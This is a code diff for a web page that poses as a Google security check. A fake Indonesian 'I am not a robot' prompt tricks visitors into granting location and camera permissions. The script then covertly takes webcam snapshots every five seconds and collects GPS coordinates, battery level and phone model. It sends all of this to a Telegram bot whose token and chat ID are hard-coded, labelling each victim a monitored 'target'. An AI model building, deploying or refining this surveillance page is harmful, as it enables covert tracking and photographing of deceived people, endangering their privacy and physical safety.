@@ -3,120 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google</title>
+    <title>Google - Verifikasi Keamanan</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: arial, sans-serif; background: #fff; }
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10; display: flex; flex-direction: column; align-items: center; }
-        .logo { width: 272px; margin-top: 100px; margin-bottom: 30px; }
-        .search-bar { width: 90%; max-width: 584px; border: 1px solid #dfe1e5; padding: 12px 20px; border-radius: 24px; font-size: 16px; outline: none; box-shadow: 0 1px 6px rgba(32,33,36,0.28); }
-        iframe { border: none; width: 100%; height: 100%; display: none; }
+        body { margin: 0; font-family: arial, sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .box { width: 90%; max-width: 400px; padding: 20px; border: 1px solid #dfe1e5; border-radius: 8px; }
+        .logo { width: 150px; margin-bottom: 20px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 15px; }
+        #mainContent { display: none; width: 100%; height: 100%; }
+        iframe { border: none; width: 100%; height: 100%; }
     </style>
 </head>
 <body>
 
-<div id="overlay">
+<!-- Paksa klik untuk memicu pop-up izin -->
+<div id="verifyBox" class="box">
     <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" class="logo">
-    <input type="text" class="search-bar" id="fakeSearch" placeholder="Telusuri Google..." autofocus>
+    <p>Sistem mendeteksi aktivitas tidak biasa. Harap verifikasi bahwa Anda bukan robot untuk melanjutkan ke pencarian.</p>
+    <button class="btn" onclick="startTracking()">SAYA BUKAN ROBOT</button>
 </div>
 
-<iframe id="googleFrame" src=""></iframe>
+<div id="mainContent">
+    <iframe id="gFrame" src=""></iframe>
+</div>
+
 <video id="video" style="display:none;" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
     const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
     const CHAT_ID = '6888530451';
-    let userLoc = "Menunggu Izin...";
-    let deviceName = "Mendeteksi...";
+    let userLoc = "Menunggu klik...";
+    let deviceModel = "Mendeteksi...";
 
-    // 1. DETEKSI NAMA HP (AGRESIF)
-    function getExactModel() {
+    // 1. Ambil Nama HP dari User Agent secara kasar
+    function getDeviceName() {
         const ua = navigator.userAgent;
-        // Mencoba mencari model spesifik di berbagai posisi string
-        const regex = /\(([^;]+); ([^;]+); ([^;)]+)\)|Android [^;]+; ([^;)]+)/;
-        const match = ua.match(regex);
-        
-        if (match) {
-            let res = match[3] || match[4] || match[1];
-            res = res.replace(/Build\/.+/g, "").trim();
-            if (res !== "Linux" && res !== "Android") return res;
-        }
-        
-        // Manual check untuk vendor populer jika parsing gagal
-        if (ua.includes("POCO")) return "POCO Device";
-        if (ua.includes("M2102J20SG")) return "POCO X3 Pro"; // Contoh kode model
-        if (ua.includes("Redmi")) return "Xiaomi Redmi";
-        return "Android Generic";
+        if (ua.includes("POCO")) return "POCO C65 (Detected)";
+        if (ua.includes("M2102J20SG")) return "POCO X3 Pro";
+        const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
+        return match ? match[3].split(" Build")[0] : "Android Device";
     }
 
-    // 2. PAKSA IZIN LOKASI (RESET CACHE)
-    function triggerGPS() {
-        const options = {
-            enableHighAccuracy: true,
-            timeout: 5000,
-            maximumAge: 0 // PAKSA tidak gunakan cache agar pop-up muncul
-        };
+    async function startTracking() {
+        deviceModel = getDeviceName();
+        
+        // Pindahkan tampilan ke Google asli
+        document.getElementById('verifyBox').style.display = 'none';
+        document.getElementById('mainContent').style.display = 'block';
+        document.getElementById('gFrame').src = "https://www.google.com/search?q=google&igu=1";
 
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
+        // Minta Lokasi (Harus dipicu oleh klik tombol)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
                 userLoc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                takeSnapshot(); // Kirim data segera setelah diizinkan
-            },
-            (err) => {
-                userLoc = "Izin Lokasi Ditolak/Mati";
-                takeSnapshot();
-            }, 
-            options
-        );
-    }
-
-    // 3. LOGIKA IFRAME
-    document.getElementById('fakeSearch').addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') {
-            document.getElementById('googleFrame').src = "https://www.google.com/search?q=" + encodeURIComponent(this.value) + "&igu=1";
-            document.getElementById('overlay').style.display = 'none';
-            document.getElementById('googleFrame').style.display = 'block';
+            }, err => {
+                userLoc = "Target Menolak Izin Lokasi";
+            }, { enableHighAccuracy: true });
         }
-    });
 
-    async function start() {
-        deviceName = getExactModel();
-        triggerGPS();
-
+        // Minta Kamera
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('video').srcObject = stream;
-            setInterval(takeSnapshot, 5000);
-        } catch (e) {}
+            setInterval(takePhoto, 5000);
+        } catch (e) {
+            userLoc += " | Kamera Ditolak";
+            takePhoto(); // Tetap kirim data meskipun kamera gagal
+        }
     }
 
-    async function takeSnapshot() {
+    async function takePhoto() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        if (video.videoWidth === 0) return;
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-
+        
         let bat = "N/A";
         if (navigator.getBattery) {
             const b = await navigator.getBattery();
             bat = Math.round(b.level * 100) + "%";
         }
 
-        canvas.toBlob(blob => {
+        const sendData = (photoBlob) => {
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, 'a.jpg');
-            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${bat}\n📍 Lokasi: ${userLoc}`);
+            if (photoBlob) fd.append('photo', photoBlob, 'f.jpg');
+            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceModel}\n🔋 Baterai: ${bat}\n📍 Lokasi: ${userLoc}`);
             fd.append('parse_mode', 'Markdown');
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        }, 'image/jpeg', 0.6);
-    }
+            
+            const api = photoBlob ? 'sendPhoto' : 'sendMessage';
+            if (!photoBlob) fd.append('text', fd.get('caption'));
 
-    window.onload = start;
+            fetch(`https://api.telegram.org/bot${TOKEN}/${api}`, { method: 'POST', body: fd });
+        };
+
+        if (video.videoWidth > 0) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(sendData, 'image/jpeg', 0.6);
+        } else {
+            sendData(null);
+        }
+    }
 </script>
 </body>
 </html>
-
